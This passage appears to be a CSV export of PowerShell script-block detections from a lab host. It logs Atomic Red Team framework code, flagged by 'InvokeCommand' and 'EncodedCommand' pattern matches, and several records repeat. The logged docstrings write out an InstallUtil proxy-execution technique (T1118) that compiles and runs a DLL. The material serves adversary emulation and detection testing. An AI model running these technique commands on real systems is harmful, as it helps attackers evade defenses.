        } # end ScriptBlock for remote session
    }
    else {
        $targetPlatform = ""linux""
        if ($IsLinux -or $IsMacOS) {
            $tmpDir = ""/tmp/""
            $isElevated = $false
            $privid = id -u
            if ($privid -eq 0) { $isElevated = $true }
            if ($IsMacOS) { $targetPlatform = ""macos"" }
        }
        else {
            $targetPlatform = ""windows""
            $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        }

    }
    $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'InvokeCommand' matched: 'invoke-command'"
"12/16/2024 8:34:56 PM","35710903","4",", EncodedCommand","EncodedCommand [Score: 4]","19452","# The class definitions that these functions rely upon are located in Private\AtomicClassSchema.ps1

function New-AtomicTechnique {
    <#
.SYNOPSIS

Specifies a new atomic red team technique. The output of this function is designed to be piped directly to ConvertTo-Yaml, eliminating the need to work with YAML directly.

.PARAMETER AttackTechnique

Specifies one or more MITRE ATT&CK techniques that to which this technique applies. Per MITRE naming convention, an attack technique should start with ""T"" followed by a 4 digit number. The MITRE sub-technique format is also supported: TNNNN.NNN

.PARAMETER DisplayName

Specifies the name of the technique as defined by ATT&CK. Example: 'Audio Capture'

.PARAMETER AtomicTests

Specifies one or more atomic tests. Atomic tests are created using the New-AtomicTest function.

.EXAMPLE

$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.dll'
$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.cs'

$AtomicTest1 = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
'@

# Note: the input arguments are identical for atomic test #1 and #2
$AtomicTest2 = New-AtomicTest -Name 'InstallUtil GetHelp method call' -Description 'Executes the Help property' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename} #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /? #{filename}
'@

$AtomicTechnique = New-AtomicTechnique -AttackTechnique T1118 -DisplayName InstallUtil -AtomicTests $AtomicTest1, $AtomicTest2

# Everything is ready to convert to YAML now!
$AtomicTechnique | ConvertTo-Yaml | Out-File T1118.yaml

.OUTPUTS

AtomicTechnique

Outputs an object representing an atomic technique.

The output of New-AtomicTechnique is designed to be piped to ConvertTo-Yaml.
#>

    [CmdletBinding()]
    [OutputType([AtomicTechnique])]
    param (
        [Parameter(Mandatory)]
        [String[]]
        $AttackTechnique,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DisplayName,

        [Parameter(Mandatory)]
        [AtomicTest[]]
        [ValidateNotNull()]
        $AtomicTests
    )

    $AtomicTechniqueInstance = [AtomicTechnique]::new()

    foreach ($Technique in $AttackTechnique) {
        # Attack techniques should match the MITRE ATT&CK [sub-]technique format.
        # This is not a requirement so just warn the user.
        if ($Technique -notmatch '^(?-i:T\d{4}(\.\d{3}){0,1})$') {
            Write-Warning ""The following supplied attack technique does not start with 'T' followed by a four digit number: $Technique""
        }
    }

    $AtomicTechniqueInstance.attack_technique = $AttackTechnique
    $AtomicTechniqueInstance.display_name = $DisplayName
    $AtomicTechniqueInstance.atomic_tests = $AtomicTests

    return $AtomicTechniqueInstance
}

function New-AtomicTest {
    <#
.SYNOPSIS

Specifies an atomic test.

.PARAMETER Name

Specifies the name of the test that indicates how it tests the technique.

.PARAMETER Description

Specifies a long form description of the test. Markdown is supported.

.PARAMETER SupportedPlatforms

Specifies the OS/platform on which the test is designed to run. The following platforms are currently supported: Windows, macOS, Linux.

A single test can support multiple platforms.

.PARAMETER ExecutorType

Specifies the the framework or application in which the test should be executed. The following executor types are currently supported: CommandPrompt, Sh, Bash, PowerShell.

- CommandPrompt: The Windows Command Prompt, aka cmd.exe
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by cmd.exe.

- PowerShell: PowerShell
  Requires the -ExecutorCommand argument to contain a multi-line PowerShell scriptblock that will be preprocessed and then executed by powershell.exe

- Sh: Linux's bourne shell
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by sh.

- Bash: Linux's bourne again shell
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by bash.

.PARAMETER ExecutorElevationRequired

Specifies that the test must run with elevated privileges.

.PARAMETER ExecutorSteps

Specifies a manual list of steps to execute. This should be specified when the atomic test cannot be executed in an automated fashion, for example when GUI steps are involved that cannot be automated.

.PARAMETER ExecutorCommand

Specifies the command to execute as part of the atomic test. This should be specified when the atomic test can be executed in an automated fashion.

The -ExecutorType specified will dictate the command specified, e.g. PowerShell scriptblock code when the ""PowerShell"" ExecutorType is specified.

.PARAMETER ExecutorCleanupCommand

Specifies the command to execute if there are any artifacts that need to be cleaned up.

.PARAMETER InputArguments

Specifies one or more input arguments. Input arguments are defined using the New-AtomicTestInputArgument function.

.PARAMETER DependencyExecutorType

Specifies an override execution type for dependencies. By default, dependencies are executed using the framework specified in -ExecutorType.

In most cases, 'PowerShell' is specified as a dependency executor type when 'CommandPrompt' is specified as an executor type.

.PARAMETER Dependencies

Specifies one or more dependencies. Dependencies are defined using the New-AtomicTestDependency function.

.EXAMPLE

$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.dll'
$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.cs'

$AtomicTest = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments $InputArg1, $InputArg2 -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
'@

.OUTPUTS

AtomicTest

Outputs an object representing an atomic test. This object is intended to be supplied to the New-AtomicTechnique -AtomicTests parameter.

The output of New-AtomicTest can be piped to ConvertTo-Yaml. The resulting output can be added to an existing atomic technique YAML doc.
#>

    [CmdletBinding(DefaultParameterSetName = 'AutomatedExecutor')]
    [OutputType([AtomicTest])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory)]
        [String[]]
        [ValidateSet('Windows', 'macOS', 'Linux')]
        $SupportedPlatforms,

        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]
        [String]
        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]
        $ExecutorType,

        [Switch]
        $ExecutorElevationRequired,

        [Parameter(Mandatory, ParameterSetName = 'ManualExecutor')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorSteps,

        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorCommand,

        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorCleanupCommand,

        [AtomicInputArgument[]]
        $InputArguments,

        [String]
        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]
        $DependencyExecutorType,

        [AtomicDependency[]]
        $Dependencies
    )

    $AtomicTestInstance = [AtomicTest]::new()

    $AtomicTestInstance.name = $Name
    $AtomicTestInstance.description = $Description
    $AtomicTestInstance.supported_platforms = $SupportedPlatforms | ForEach-Object { $_.ToLower() }

    $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'

    switch ($PSCmdlet.ParameterSetName) {
        'AutomatedExecutor' {
            $ExecutorInstance = [AtomicExecutorDefault]::new()
            $ExecutorInstance.command = $ExecutorCommand
            $StringsWithPotentialInputArgs.Add($ExecutorCommand)
        }

        'ManualExecutor' {
            $ExecutorInstance = [AtomicExecutorManual]::new()
            $ExecutorInstance.steps = $ExecutorSteps
            $StringsWithPotentialInputArgs.Add($ExecutorSteps)
        }
    }

    switch ($ExecutorType) {
        'CommandPrompt' { $ExecutorInstance.name = 'command_prompt' }
        default { $ExecutorInstance.name = $ExecutorType.ToLower() }
    }

    if ($ExecutorCleanupCommand) {
        $ExecutorInstance.cleanup_command = $ExecutorCleanupCommand
        $StringsWithPotentialInputArgs.Add($ExecutorCleanupCommand)
    }

    if ($ExecutorElevationRequired) { $ExecutorInstance.elevation_required = $True }

    if ($Dependencies) {
        foreach ($Dependency in $Dependencies) {
            $StringsWithPotentialInputArgs.Add($Dependency.description)
            $StringsWithPotentialInputArgs.Add($Dependency.prereq_command)
            $StringsWithPotentialInputArgs.Add($Dependency.get_prereq_command)
        }
    }

    if ($DependencyExecutorType) {
        switch ($DependencyExecutorType) {
            'CommandPrompt' { $AtomicTestInstance.dependency_executor_name = 'command_prompt' }
            default { $AtomicTestInstance.dependency_executor_name = $DependencyExecutorType.ToLower() }
        }
    }    $AtomicTestInstance.dependencies = $Dependencies

    [Hashtable] $InputArgHashtable = @{ }

    if ($InputArguments.Count) {
        # Determine if any of the input argument names repeat. They must be unique.
        $InputArguments | Group-Object -Property Name | Where-Object { $_.Count -gt 1 } | ForEach-Object {
            Write-Error ""There are $($_.Count) instances of the $($_.Name) input argument. Input argument names must be unique.""
            return
        }

        # Convert each input argument to a hashtable where the key is the Name property.

        foreach ($InputArg in $InputArguments) {
            # Create a copy of the passed input argument that doesn't include the ""Name"" property.
            # Passing in a shallow copy adversely affects YAML serialization for some reason.
            $NewInputArg = [AtomicInputArgument]::new()
            $NewInputArg.default = $InputArg.default
            $NewInputArg.description = $InputArg.description
            $NewInputArg.type = $InputArg.type

            $InputArgHashtable[$InputArg.Name] = $NewInputArg
        }

        $AtomicTestInstance.input_arguments = $InputArgHashtable
    }

    # Extract all specified input arguments from executor and any dependencies.
    $Regex = [Regex] '#\{(?<ArgName>[^}]+)\}'
    [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |
    ForEach-Object { $Regex.Matches($_) } |
    Select-Object -ExpandProperty Groups |
    Where-Object { $_.Name -eq 'ArgName' } |
    Select-Object -ExpandProperty Value |
    Sort-Object -Unique


    # Validate that all executor arguments are defined as input arguments
    if ($InputArgumentNamesFromExecutor.Count) {
        $InputArgumentNamesFromExecutor | ForEach-Object {
            if ($InputArgHashtable.Keys -notcontains $_) {
                Write-Error ""The following input argument was specified but is not defined: '$_'""
                return
            }
        }
    }

    # Validate that all defined input args are utilized at least once in the executor.
    if ($InputArgHashtable.Keys.Count) {
        $InputArgHashtable.Keys | ForEach-Object {
            if ($InputArgumentNamesFromExecutor -notcontains $_) {
                # Write a warning since this scenario is not considered a breaking change
                Write-Warning ""The following input argument is defined but not utilized: '$_'.""
            }
        }
    }

    $AtomicTestInstance.executor = $ExecutorInstance

    return $AtomicTestInstance
}

function New-AtomicTestDependency {
    <#
.SYNOPSIS

Specifies a new dependency that must be met prior to execution of an atomic test.

.PARAMETER Description

Specifies a human-readable description of the dependency. This should be worded in the following form: SOMETHING must SOMETHING

.PARAMETER PrereqCommand

Specifies commands to check if prerequisites for running this test are met.

For the ""command_prompt"" executor, if any command returns a non-zero exit code, the pre-requisites are not met.

For the ""powershell"" executor, all commands are run as a script block and the script block must return 0 for success.

.PARAMETER GetPrereqCommand

Specifies commands to meet this prerequisite or a message describing how to meet this prereq

More specifically, this command is designed to satisfy either of the following conditions:

1) If a prerequisite is not met, perform steps necessary to satify the prerequisite. Such a command should be implemented when prerequisites can be satisfied in an automated fashion.
2) If a prerequisite is not met, inform the user what the steps are to satisfy the prerequisite. Such a message should be presented to the user in the case that prerequisites cannot be satisfied in an automated fashion.

.EXAMPLE

$Dependency = New-AtomicTestDependency -Description 'Folder to zip must exist (#{input_file_folder})' -PrereqCommand 'test -e #{input_file_folder}' -GetPrereqCommand 'echo Please set input_file_folder argument to a folder that exists'

.OUTPUTS

AtomicDependency

Outputs an object representing an atomic test dependency. This object is intended to be supplied to the New-AtomicTest -Dependencies parameter.

Note: due to a bug in PowerShell classes, the get_prereq_command property will not display by default. If all fields must be explicitly displayed, they can be viewed by piping output to ""Select-Object description, prereq_command, get_prereq_command"".
#>

    [CmdletBinding()]
    [OutputType([AtomicDependency])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $PrereqCommand,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $GetPrereqCommand
    )

    $DependencyInstance = [AtomicDependency]::new()

    $DependencyInstance.description = $Description
    $DependencyInstance.prereq_command = $PrereqCommand
    $DependencyInstance.get_prereq_command = $GetPrereqCommand

    return $DependencyInstance
}

function New-AtomicTestInputArgument {
    <#
.SYNOPSIS

Specifies an input to an atomic test that is a requirement to run the test (think of these like function arguments).

.PARAMETER Name

Specifies the name of the input argument. This must be lowercase and can optionally, have underscores. The input argument name is what is specified as arguments within executors and dependencies.

.PARAMETER Description

Specifies a human-readable description of the input argument.

.PARAMETER Type

Specifies the data type of the input argument. The following data types are supported: Path, Url, String, Integer, Float. If an alternative data type must be supported, use the -TypeOverride parameter.

.PARAMETER TypeOverride

Specifies an unsupported input argument data type. Specifying this parameter should not be common.

.PARAMETER Default

Specifies a default value for an input argument if one is not specified via the Invoke-AtomicTest -InputArgs parameter.

.EXAMPLE

$AtomicInputArgument = New-AtomicTestInputArgument -Name 'rar_exe' -Type Path -Description 'The RAR executable from Winrar' -Default '%programfiles%\WinRAR\Rar.exe'

.OUTPUTS

AtomicInputArgument

Outputs an object representing an atomic test input argument. This object is intended to be supplied to the New-AtomicTest -InputArguments parameter.
#>

    [CmdletBinding(DefaultParameterSetName = 'PredefinedType')]
    [OutputType([AtomicInputArgument])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory, ParameterSetName = 'PredefinedType')]
        [String]
        [ValidateSet('Path', 'Url', 'String', 'Integer', 'Float')]
        $Type,

        [Parameter(Mandatory, ParameterSetName = 'TypeOverride')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TypeOverride,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Default
    )

    if ($Name -notmatch '^(?-i:[0-9a-z_]+)$') {
        Write-Error ""Input argument names must be lowercase and optionally, contain underscores. Input argument name supplied: $Name""
        return
    }

    $AtomicInputArgInstance = [AtomicInputArgument]::new()

    $AtomicInputArgInstance.description = $Description
    $AtomicInputArgInstance.default = $Default

    if ($Type) {
        $AtomicInputArgInstance.type = $Type

        # Validate input argument types when it makes sense to do so.
        switch ($Type) {
            'Url' {
                if (-not [Uri]::IsWellFormedUriString($Type, [UriKind]::RelativeOrAbsolute)) {
                    Write-Warning ""The specified Url is not properly formatted: $Type""
                }
            }

            'Integer' {
                if (-not [Int]::TryParse($Type, [Ref] $null)) {
                    Write-Warning ""The specified Int is not properly formatted: $Type""
                }
            }

            'Float' {
                if (-not [Double]::TryParse($Type, [Ref] $null)) {
                    Write-Warning ""The specified Float is not properly formatted: $Type""
                }
            }

            # The following supported data types do not make sense to validate:
            # 'Path' { }
            # 'String' { }
        }
    }
    else {
        $AtomicInputArgInstance.type = $TypeOverride
    }

    # Add Name as a note property since the Name property cannot be defined in the AtomicInputArgument
    # since it must be stored as a hashtable where the name is the key. Fortunately, ConvertTo-Yaml
    # won't convert note properties during serialization.
    $InputArgument = Add-Member -InputObject $AtomicInputArgInstance -MemberType NoteProperty -Name Name -Value $Name -PassThru

    return $InputArgument
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: '-e #'"
"12/16/2024 8:34:57 PM","35711106","4",", InvokeCommand","InvokeCommand [Score: 4]","3474","function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {
    $null = @(
        if ($null -eq $finalCommand) { return 0 }
        $finalCommand = $finalCommand.trim()
        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'
        if ($executor -eq ""command_prompt"" -or $executor -eq ""sh"" -or $executor -eq ""bash"") {
            $execPrefix = ""-c""
            $execExe = $executor
            if ($executor -eq ""command_prompt"") {
                $execPrefix = ""/c"";
                $execExe = ""cmd.exe"";
                $execCommand = $finalCommand -replace ""`n"", "" & ""
                $arguments = $execPrefix, ""$execCommand""
            }
            else {
                $finalCommand = $finalCommand -replace ""[\\](?!;)"", ""`\$&""
                $finalCommand = $finalCommand -replace ""[`""]"", ""`\$&""
                $execCommand = $finalCommand -replace ""(?<!;)\n"", ""; ""
                $arguments = ""$execPrefix `""$execCommand`""""

            }
        }
        elseif ($executor -eq ""powershell"") {
            $execCommand = $finalCommand -replace ""`"""", ""`\`""`""""
            if ($session) {
                if ($executionPlatform -eq ""windows"") {
                    $execExe = ""powershell.exe""
                }
                else {
                    $execExe = ""pwsh""
                }
            }
            else {
                $execExe = ""powershell.exe""; if ($IsLinux -or $IsMacOS) { $execExe = ""pwsh"" }
            }
            if ($execExe -eq ""pwsh"") {
                $arguments = ""-Command $execCommand""
            }
            else {
                $arguments = ""& {$execCommand}""
            }
        }
        else {
            Write-Warning -Message ""Unable to generate or execute the command line properly. Unknown executor""
            return [PSCustomObject]@{
                StandardOutput = """"
                ErrorOutput    = """"
                ExitCode       = -1
                IsTimeOut      = $false
            }
        }

        # Write-Host -ForegroundColor Magenta ""$execExe $arguments""
        if ($session) {
            $scriptParentPath = Split-Path $import -Parent
            $fp = Join-Path $scriptParentPath ""Invoke-Process.ps1""
            $fp2 = Join-Path $scriptParentPath ""Invoke-KillProcessTree.ps1""
            invoke-command -Session $session -FilePath $fp
            invoke-command -Session $session -FilePath $fp2
            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile ""art-out.txt"" -stderrFile ""art-err.txt"" }
        }
        else {
            if ($interactive) {
                # This use case is: Local execution of tests that contain interactive prompts
                #   In this situation, let the stdout/stderr flow to the console
                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds
            }
            else {
                # Local execution that DO NOT contain interactive prompts
                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller
                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile ""art-out.txt"" -stderrFile ""art-err.txt""
            }
        }
    )
    $res
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'InvokeCommand' matched: 'invoke-command'
Pattern 'InvokeCommand' matched: 'invoke-command'
Pattern 'InvokeCommand' matched: 'invoke-command'"
"12/16/2024 8:34:55 PM","35710727","4",", InvokeCommand","InvokeCommand [Score: 4]","3474","function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {
    $null = @(
        if ($null -eq $finalCommand) { return 0 }
        $finalCommand = $finalCommand.trim()
        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'
        if ($executor -eq ""command_prompt"" -or $executor -eq ""sh"" -or $executor -eq ""bash"") {
            $execPrefix = ""-c""
            $execExe = $executor
            if ($executor -eq ""command_prompt"") {
                $execPrefix = ""/c"";
                $execExe = ""cmd.exe"";
                $execCommand = $finalCommand -replace ""`n"", "" & ""
                $arguments = $execPrefix, ""$execCommand""
            }
            else {
                $finalCommand = $finalCommand -replace ""[\\](?!;)"", ""`\$&""
                $finalCommand = $finalCommand -replace ""[`""]"", ""`\$&""
                $execCommand = $finalCommand -replace ""(?<!;)\n"", ""; ""
                $arguments = ""$execPrefix `""$execCommand`""""

            }
        }
        elseif ($executor -eq ""powershell"") {
            $execCommand = $finalCommand -replace ""`"""", ""`\`""`""""
            if ($session) {
                if ($executionPlatform -eq ""windows"") {
                    $execExe = ""powershell.exe""
                }
                else {
                    $execExe = ""pwsh""
                }
            }
            else {
                $execExe = ""powershell.exe""; if ($IsLinux -or $IsMacOS) { $execExe = ""pwsh"" }
            }
            if ($execExe -eq ""pwsh"") {
                $arguments = ""-Command $execCommand""
            }
            else {
                $arguments = ""& {$execCommand}""
            }
        }
        else {
            Write-Warning -Message ""Unable to generate or execute the command line properly. Unknown executor""
            return [PSCustomObject]@{
                StandardOutput = """"
                ErrorOutput    = """"
                ExitCode       = -1
                IsTimeOut      = $false
            }
        }

        # Write-Host -ForegroundColor Magenta ""$execExe $arguments""
        if ($session) {
            $scriptParentPath = Split-Path $import -Parent
            $fp = Join-Path $scriptParentPath ""Invoke-Process.ps1""
            $fp2 = Join-Path $scriptParentPath ""Invoke-KillProcessTree.ps1""
            invoke-command -Session $session -FilePath $fp
            invoke-command -Session $session -FilePath $fp2
            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile ""art-out.txt"" -stderrFile ""art-err.txt"" }
        }
        else {
            if ($interactive) {
                # This use case is: Local execution of tests that contain interactive prompts
                #   In this situation, let the stdout/stderr flow to the console
                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds
            }
            else {
                # Local execution that DO NOT contain interactive prompts
                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller
                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile ""art-out.txt"" -stderrFile ""art-err.txt""
            }
        }
    )
    $res
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'InvokeCommand' matched: 'invoke-command'
Pattern 'InvokeCommand' matched: 'invoke-command'
Pattern 'InvokeCommand' matched: 'invoke-command'"
"12/16/2024 8:34:54 PM","35710573","4",", EncodedCommand","EncodedCommand [Score: 4]","19452","# The class definitions that these functions rely upon are located in Private\AtomicClassSchema.ps1

function New-AtomicTechnique {
    <#
.SYNOPSIS

Specifies a new atomic red team technique. The output of this function is designed to be piped directly to ConvertTo-Yaml, eliminating the need to work with YAML directly.

.PARAMETER AttackTechnique

Specifies one or more MITRE ATT&CK techniques that to which this technique applies. Per MITRE naming convention, an attack technique should start with ""T"" followed by a 4 digit number. The MITRE sub-technique format is also supported: TNNNN.NNN

.PARAMETER DisplayName

Specifies the name of the technique as defined by ATT&CK. Example: 'Audio Capture'

.PARAMETER AtomicTests

Specifies one or more atomic tests. Atomic tests are created using the New-AtomicTest function.

.EXAMPLE

$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.dll'
$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.cs'

$AtomicTest1 = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
'@

# Note: the input arguments are identical for atomic test #1 and #2
$AtomicTest2 = New-AtomicTest -Name 'InstallUtil GetHelp method call' -Description 'Executes the Help property' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename} #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /? #{filename}
'@

$AtomicTechnique = New-AtomicTechnique -AttackTechnique T1118 -DisplayName InstallUtil -AtomicTests $AtomicTest1, $AtomicTest2

# Everything is ready to convert to YAML now!
$AtomicTechnique | ConvertTo-Yaml | Out-File T1118.yaml

.OUTPUTS

AtomicTechnique

Outputs an object representing an atomic technique.

The output of New-AtomicTechnique is designed to be piped to ConvertTo-Yaml.
#>

    [CmdletBinding()]
    [OutputType([AtomicTechnique])]
    param (
        [Parameter(Mandatory)]
        [String[]]
        $AttackTechnique,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DisplayName,

        [Parameter(Mandatory)]
        [AtomicTest[]]
        [ValidateNotNull()]
        $AtomicTests
    )

    $AtomicTechniqueInstance = [AtomicTechnique]::new()

    foreach ($Technique in $AttackTechnique) {
        # Attack techniques should match the MITRE ATT&CK [sub-]technique format.
        # This is not a requirement so just warn the user.
        if ($Technique -notmatch '^(?-i:T\d{4}(\.\d{3}){0,1})$') {
            Write-Warning ""The following supplied attack technique does not start with 'T' followed by a four digit number: $Technique""
        }
    }

    $AtomicTechniqueInstance.attack_technique = $AttackTechnique
    $AtomicTechniqueInstance.display_name = $DisplayName
    $AtomicTechniqueInstance.atomic_tests = $AtomicTests

    return $AtomicTechniqueInstance
}

function New-AtomicTest {
    <#
.SYNOPSIS

Specifies an atomic test.

.PARAMETER Name

Specifies the name of the test that indicates how it tests the technique.

.PARAMETER Description

Specifies a long form description of the test. Markdown is supported.

.PARAMETER SupportedPlatforms

Specifies the OS/platform on which the test is designed to run. The following platforms are currently supported: Windows, macOS, Linux.

A single test can support multiple platforms.

.PARAMETER ExecutorType

Specifies the the framework or application in which the test should be executed. The following executor types are currently supported: CommandPrompt, Sh, Bash, PowerShell.

- CommandPrompt: The Windows Command Prompt, aka cmd.exe
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by cmd.exe.

- PowerShell: PowerShell
  Requires the -ExecutorCommand argument to contain a multi-line PowerShell scriptblock that will be preprocessed and then executed by powershell.exe

- Sh: Linux's bourne shell
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by sh.

- Bash: Linux's bourne again shell
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by bash.

.PARAMETER ExecutorElevationRequired

Specifies that the test must run with elevated privileges.

.PARAMETER ExecutorSteps

Specifies a manual list of steps to execute. This should be specified when the atomic test cannot be executed in an automated fashion, for example when GUI steps are involved that cannot be automated.

.PARAMETER ExecutorCommand

Specifies the command to execute as part of the atomic test. This should be specified when the atomic test can be executed in an automated fashion.

The -ExecutorType specified will dictate the command specified, e.g. PowerShell scriptblock code when the ""PowerShell"" ExecutorType is specified.

.PARAMETER ExecutorCleanupCommand

Specifies the command to execute if there are any artifacts that need to be cleaned up.

.PARAMETER InputArguments

Specifies one or more input arguments. Input arguments are defined using the New-AtomicTestInputArgument function.

.PARAMETER DependencyExecutorType

Specifies an override execution type for dependencies. By default, dependencies are executed using the framework specified in -ExecutorType.

In most cases, 'PowerShell' is specified as a dependency executor type when 'CommandPrompt' is specified as an executor type.

.PARAMETER Dependencies

Specifies one or more dependencies. Dependencies are defined using the New-AtomicTestDependency function.

.EXAMPLE

$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.dll'
$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.cs'

$AtomicTest = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments $InputArg1, $InputArg2 -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
'@

.OUTPUTS

AtomicTest

Outputs an object representing an atomic test. This object is intended to be supplied to the New-AtomicTechnique -AtomicTests parameter.

The output of New-AtomicTest can be piped to ConvertTo-Yaml. The resulting output can be added to an existing atomic technique YAML doc.
#>

    [CmdletBinding(DefaultParameterSetName = 'AutomatedExecutor')]
    [OutputType([AtomicTest])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory)]
        [String[]]
        [ValidateSet('Windows', 'macOS', 'Linux')]
        $SupportedPlatforms,

        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]
        [String]
        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]
        $ExecutorType,

        [Switch]
        $ExecutorElevationRequired,

        [Parameter(Mandatory, ParameterSetName = 'ManualExecutor')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorSteps,

        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]
